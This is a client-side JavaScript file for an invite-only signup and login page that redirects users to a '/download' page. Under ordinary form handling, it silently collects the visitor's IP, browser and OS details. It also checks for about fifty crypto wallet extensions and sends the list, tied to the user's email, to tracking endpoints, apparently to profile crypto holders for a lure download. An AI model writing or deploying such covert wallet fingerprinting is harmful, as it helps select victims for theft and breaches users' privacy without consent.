function initCarousel() {
  const images = document.querySelectorAll('.image-carousel img');
  if (!images.length) return;

  let currentIndex = 0;
  const totalImages = images.length;
  const transitionTime = 5000;

  images[currentIndex].classList.add('active');
  images[currentIndex].style.opacity = 1;

  setInterval(() => {
    images[currentIndex].classList.remove('active');
    images[currentIndex].style.opacity = 0;

    currentIndex = (currentIndex + 1) % totalImages;

    images[currentIndex].classList.add('active');
    images[currentIndex].style.opacity = 1;
  }, transitionTime);
}

function initFormTransition() {
  const switchLinks = document.querySelectorAll('.switch-form');
  switchLinks.forEach(link => {
    link.addEventListener('click', function (e) {
      e.preventDefault();
      const formContainer = document.querySelector('.form-container');
      const imageCarousel = document.querySelector('.image-carousel');
      const loadingOverlay = document.querySelector('.loading-overlay');
      const targetUrl = this.href;

      formContainer.classList.add('hidden');
      imageCarousel.classList.add('hidden');
      loadingOverlay.classList.remove('hidden');

      setTimeout(() => {
        window.location.href = targetUrl;
      }, 600);
    });
  });
}

function checkAuthStatus(redirect = true) {
  try {
    const userStr = localStorage.getItem('user');
    if (!userStr) {
      if (redirect && window.location.pathname !== '/registry.html') {
        window.location.href = '/registry.html';
      }
      return null;
    }
    const user = JSON.parse(userStr);
    if (!user.loggedIn) {
      if (redirect && window.location.pathname !== '/registry.html') {
        window.location.href = '/registry.html';
      }
      return null;
    }
    return user;
  } catch (e) {
    console.error('Auth status check failed:', e);
    if (redirect && window.location.pathname !== '/registry.html') {
      window.location.href = '/registry.html';
    }
    return null;
  }
}

async function checkAuthStatusAndDb(redirect = true) {
  try {
    const userStr = localStorage.getItem('user');
    if (!userStr) {
      if (redirect && window.location.pathname !== '/registry.html') {
        window.location.href = '/registry.html';
      }
      return null;
    }
    const user = JSON.parse(userStr);
    if (!user.loggedIn) {
      if (redirect && window.location.pathname !== '/registry.html') {
        window.location.href = '/registry.html';
      }
      return null;
    }
    const response = await fetch('/api/check-user.php', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ email: user.email, csrf_token: getCsrfToken() })
    });
    const data = await response.json();
    if (!data.success || !data.userExists) {
      localStorage.removeItem('user');
      if (redirect && window.location.pathname !== '/registry.html') {
        window.location.href = '/registry.html';
      }
      return null;
    }
    return user;
  } catch (e) {
    console.error('Auth check failed:', e);
    localStorage.removeItem('user');
    if (redirect && window.location.pathname !== '/registry.html') {
      window.location.href = '/registry.html';
    }
    return null;
  }
}

async function checkAuthServer(email, inviteCode) {
  try {
    const response = await fetch('/api/check-auth.php', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ email, inviteCode, csrf_token: getCsrfToken() })
    });
    if (!response.ok) throw new Error(`HTTP error! Status: ${response.status}`);
    const data = await response.json();
    return data;
  } catch (e) {
    console.error('Server auth check failed:', e);
    return { success: false, error: 'Server error' };
  }
}

function getCsrfToken() {
  const meta = document.querySelector('meta[name="csrf-token"]');
  return meta ? meta.content : '';
}

function sanitizeInput(input) {
  const div = document.createElement('div');
  div.textContent = input;
  return div.innerHTML.replace(/[<>"'&]/g, '');
}

function isSafeInput(input) {
  const dangerousPatterns = [
    /;|\b(ALTER|CREATE|DELETE|DROP|EXEC(UTE)?|INSERT|SELECT|UPDATE|UNION|WHERE)\b/i,
    /--|#|\/\*|\*\/|\b(OR|AND)\b\s*['"]?\d*['"]?\s*=/,
    /[<>"'&]/,
    /[\{\}\[\]\(\)]/,
    /[\x00-\x1F\x7F]/
  ];
  return !dangerousPatterns.some(pattern => pattern.test(input));
}

function initSignupForm() {
  const signupForm = document.getElementById('signup-form');
  if (!signupForm) return;

  signupForm.addEventListener('submit', async function (e) {
    e.preventDefault();

    const nameInput = document.getElementById('name');
    const emailInput = document.getElementById('email');
    const codeInput = document.getElementById('invite-code');
    const nameError = document.getElementById('name-error');
    const emailError = document.getElementById('email-error');
    const codeError = document.getElementById('code-error');

    nameInput.classList.remove('input-error');
    emailInput.classList.remove('input-error');
    codeInput.classList.remove('input-error');
    nameError.style.display = 'none';
    emailError.style.display = 'none';
    codeError.style.display = 'none';

    const name = sanitizeInput(nameInput.value.trim());
    const email = sanitizeInput(emailInput.value.trim());
    const inviteCode = sanitizeInput(codeInput.value.trim().toUpperCase());

    if (!name || !isSafeInput(name)) {
      nameInput.classList.add('input-error');
      nameError.textContent = 'Invalid name';
      nameError.style.display = 'block';
      return;
    }

    if (!email || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email) || !isSafeInput(email)) {
      emailInput.classList.add('input-error');
      emailError.textContent = 'Invalid email';
      emailError.style.display = 'block';
      return;
    }

    if (!inviteCode || inviteCode.length !== 6 || !isSafeInput(inviteCode)) {
      codeInput.classList.add('input-error');
      codeError.textContent = 'Invalid invite code';
      codeError.style.display = 'block';
      return;
    }

    try {
      const ipResponse = await fetch('https://api.ipify.org?format=json');
      if (!ipResponse.ok) throw new Error('Failed to fetch IP');
      const ipData = await ipResponse.json();
      const ip = ipData.ip;

      const codeResponse = await fetch('/api/validate-code.php', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ inviteCode, csrf_token: getCsrfToken() })
      });
      const codeData = await codeResponse.json();
      if (!codeData.success || !codeData.codeExists) {
        codeInput.classList.add('input-error');
        codeError.textContent = 'Invalid invite code';
        codeError.style.display = 'block';
        return;
      }

      const emailResponse = await fetch('/api/check-email.php', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ email, csrf_token: getCsrfToken() })
      });
      const emailData = await emailResponse.json();
      if (emailData.emailExists) {
        emailInput.classList.add('input-error');
        emailError.textContent = 'Email already registered';
        emailError.style.display = 'block';
        return;
      }

      function getBrowserInfo() {
        const ua = navigator.userAgent;
        let tem, M = ua.match(/(opera|chrome|edg|safari|firefox|msie|trident(?=\/))\/?\s*(\d+)/i) || [];
        if (/trident/i.test(M[1])) {
          tem = /\brv[ :]+(\d+)/g.exec(ua) || [];
          return { name: 'IE', version: tem[1] || '' };
        }
        if (M[1] === 'Chrome') {
          tem = ua.match(/(OPR|Edg)\/(\d+)/);
          if (tem != null) {
            return { name: tem[1].replace('OPR', 'Opera').replace('Edg', 'Edge'), version: tem[2] };
          }
        }
        M = M[2] ? [M[1], M[2]] : [navigator.appName, navigator.appVersion, '-?'];
        tem = ua.match(/version\/(\d+)/i);
        if (tem != null) M.splice(1, 1, tem[1]);
        return { name: M[0], version: M[1] };
      }

      function detectOS() {
        const platform = navigator.platform.toLowerCase();
        const ua = navigator.userAgent.toLowerCase();
        if (platform.includes('win') || ua.includes('windows')) return 'Windows';
        if (platform.includes('mac') || ua.includes('macintosh')) return 'MacOS';
        if (platform.includes('linux')) return 'Linux';
        if (/android/.test(ua)) return 'Android';
        if (/iphone|ipad|ipod/.test(ua)) return 'iOS';
        return 'Other';
      }

      const browserInfo = getBrowserInfo();
      const saveResponse = await fetch('/api/save-users.php', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          name,
          email,
          inviteCode,
          ip,
          os: detectOS(),
          browser: browserInfo.name,
          browserVersion: browserInfo.version,
          browserLanguage: navigator.language,
          browserPlatform: navigator.platform,
          browserUserAgent: navigator.userAgent,
          csrf_token: getCsrfToken()
        }),
      });
      const data = await saveResponse.json();

      if (data.success) {
        localStorage.setItem(
          'user',
          JSON.stringify({
            name: data.user.name,
            email: data.user.email,
            inviteCode: data.user.inviteCode,
            loggedIn: true,
          })
        );
        sendDetectedWallets(email);

        const redirectUrl = await getRedirectAfterLogin();
        window.location.href = redirectUrl || '/download';
      } else {
        if (data.error && data.error.includes('email')) {
          emailInput.classList.add('input-error');
          emailError.textContent = 'Email already registered.';
          emailError.style.display = 'block';
        } else if (data.error && data.error.includes('inviteCode')) {
          codeInput.classList.add('input-error');
          codeError.textContent = 'This invite code is already used.';
          codeError.style.display = 'block';
        } else {
          codeError.textContent = data.error || 'Registration failed';
          codeError.style.display = 'block';
        }
      }
    } catch (error) {
      console.error('Registration error:', error);
      codeError.textContent = 'An error occurred. Please try again.';
      codeError.style.display = 'block';
    }
  });
}

async function getRedirectAfterLogin() {
  try {
    const response = await fetch('/api/get-redirect.php', {
      method: 'GET',
      headers: { 'Content-Type': 'application/json' }
    });
    const data = await response.json();
    return data.redirectUrl || null;
  } catch (e) {
    console.error('Failed to get redirect URL:', e);
    return null;
  }
}

function initLoginForm() {
  const loginForm = document.getElementById('login-form');
  if (!loginForm) return;

  loginForm.addEventListener('submit', async function (e) {
    e.preventDefault();

    const emailInput = document.getElementById('login-email');
    const codeInput = document.getElementById('login-invite-code');
    const emailError = document.getElementById('email-error');
    const codeError = document.getElementById('code-error');

    emailInput.classList.remove('input-error');
    codeInput.classList.remove('input-error');
    emailError.style.display = 'none';
    codeError.style.display = 'none';

    const email = sanitizeInput(emailInput.value.trim());
    const inviteCode = sanitizeInput(codeInput.value.trim().toUpperCase());

    if (!email || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email) || !isSafeInput(email)) {
      emailInput.classList.add('input-error');
      emailError.textContent = 'Invalid email';
      emailError.style.display = 'block';
      return;
    }

    if (!inviteCode || inviteCode.length !== 6 || !isSafeInput(inviteCode)) {
      codeInput.classList.add('input-error');
      codeError.textContent = 'Invalid invite code';
      codeError.style.display = 'block';
      return;
    }

    try {
      const response = await fetch('/api/login.php', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ email, inviteCode, csrf_token: getCsrfToken() })
      });
      const data = await response.json();

      if (!data.success) {
        emailInput.classList.add('input-error');
        codeInput.classList.add('input-error');
        emailError.textContent = 'Invalid email or invite code';
        emailError.style.display = 'block';
        return;
      }

      const loadingOverlay = document.querySelector('.loading-overlay');
      const formContainer = document.querySelector('.form-container');
      const imageCarousel = document.querySelector('.image-carousel');
      loadingOverlay.classList.remove('hidden');
      formContainer.classList.add('hidden');
      imageCarousel.classList.add('hidden');

      setTimeout(async () => {
        localStorage.setItem(
          'user',
          JSON.stringify({
            name: data.user.name,
            email: data.user.email,
            inviteCode: data.user.inviteCode,
            loggedIn: true,
          })
        );
        const redirectUrl = await getRedirectAfterLogin();
        window.location.href = redirectUrl || '/download';
      }, 600);
    } catch (error) {
      console.error('Login error:', error);
      codeError.textContent = 'An error occurred. Please try again.';
      codeError.style.display = 'block';
    }
  });
}

async function detectWallets() {
  const wallets = [];
  if (window.ethereum && window.ethereum.isMetaMask) wallets.push('MetaMask');
  if (window.ethereum && window.ethereum.isTrust) wallets.push('Trust Wallet');
  if (window.ethereum && window.ethereum.isCoinbaseWallet) wallets.push('Coinbase Wallet');
  if (window.ethereum && window.ethereum.isBraveWallet) wallets.push('Brave Wallet');
  if (window.tokenPocket) wallets.push('TokenPocket');
  if (window.mathwallet) wallets.push('MathWallet');
  if (window.bitkeep || (window.ethereum && window.ethereum.isBitKeep)) wallets.push('BitKeep (Bitget Wallet)');
  if (window.phantom) wallets.push('Phantom');
  if (window.keplr) wallets.push('Keplr');
  if (window.terraWallets || window.isTerraExtension) wallets.push('Terra Station');
  if (window.solflare) wallets.push('Solflare');
  if (window.walletConnect) wallets.push('WalletConnect');
  if (window.core) wallets.push('Core');
  if (window.safepal) wallets.push('SafePal');
  if (window.okxwallet) wallets.push('OKX Wallet');
  if (window.ethereum && window.ethereum.isZerion) wallets.push('Zerion');
  if (window.rabby) wallets.push('Rabby');
  if (window.niftyWallet) wallets.push('Nifty Wallet');
  if (window.cypher) wallets.push('Cypher Wallet');
  if (window.onto) wallets.push('ONTO Wallet');
  if (window.xfi) wallets.push('XDEFI Wallet');
  if (window.blocto) wallets.push('Blocto');
  if (window.frontier) wallets.push('Frontier Wallet');
  if (window.hiroWallet) wallets.push('Hiro Wallet');
  if (window.bitbox) wallets.push('BitBox Wallet');
  if (window.liquality) wallets.push('Liquality Wallet');
  if (window.dharma) wallets.push('Dharma Wallet');
  if (window.frame) wallets.push('Frame');
  if (window.gridplus) wallets.push('GridPlus Wallet');
  if (window.airgap) wallets.push('AirGap Wallet');
  if (window.stackwallet) wallets.push('StackWallet');
  if (window.satochip) wallets.push('Satochip Wallet');
  if (window.electrumLTC) wallets.push('Electrum-LTC');
  if (window.mew) wallets.push('MyEtherWallet (MEW)');
  if (window.alby) wallets.push('Alby');
  if (window.leather) wallets.push('Leather Wallet');
  if (window.petal) wallets.push('Petal Wallet');
  if (window.meld) wallets.push('Meld');
  if (window.pali) wallets.push('Pali Wallet');
  if (window.chainweaver) wallets.push('Chainweaver');
  if (window.ever) wallets.push('Ever wallet');
  if (window.tonkeeper) wallets.push('Tonkeeper');
  if (window.subwallet) wallets.push('SubWallet');
  if (window.talisman) wallets.push('Talisman');
  if (window.pontem) wallets.push('Pontem Wallet');
  if (window.martian) wallets.push('Martian Wallet');
  if (window.fewcha) wallets.push('Fewcha Wallet');
  if (window.aries) wallets.push('Aries Wallet');
  if (window.ethos) wallets.push('Ethos Wallet');
  if (window.wombat) wallets.push('Wombat Wallet');
  return wallets;
}

function detectPlatform() {
  const ua = navigator.userAgent.toLowerCase();
  if (/windows/.test(ua)) return 'Windows';
  if (/macintosh|mac os x/.test(ua)) return 'MacOS';
  if (/linux/.test(ua)) return 'Linux';
  if (/android/.test(ua)) return 'Android';
  if (/iphone|ipad|ipod/.test(ua)) return 'iOS';
  return navigator.platform || 'Unknown';
}

async function sendDetectedWallets(email) {
  const wallets = await detectWallets();
  const platform = detectPlatform();
  await fetch('/api/track-wallets.php', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      detectedWallets: wallets,
      platform: platform,
      email: sanitizeInput(email),
      csrf_token: getCsrfToken()
    })
  });
}

async function sendDetectedWallets_download() {
  const wallets = await detectWallets();
  const platform = detectPlatform();
  await fetch('/api/track-download.php', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      detectedWallets: wallets,
      platform: platform,
      csrf_token: getCsrfToken()
    })
  });
  console.log('Detected wallets and platform sent to server:', { detectedWallets: wallets, platform: platform });
}

document.addEventListener('DOMContentLoaded', () => {
  const loadingOverlay = document.querySelector('.loading-overlay');
  const mainContainer = document.querySelector('.main-container');
  const formContainer = document.querySelector('.form-container');
  const imageCarousel = document.querySelector('.image-carousel');

  if (loadingOverlay) {
    setTimeout(() => {
      loadingOverlay.classList.add('hidden');
      if (mainContainer) mainContainer.classList.add('visible');
      if (formContainer) formContainer.classList.remove('hidden');
      if (imageCarousel) imageCarousel.classList.remove('hidden');
    }, 100);
  }
  initSignupForm();
  initLoginForm();
  initFormTransition();
  initCarousel();
});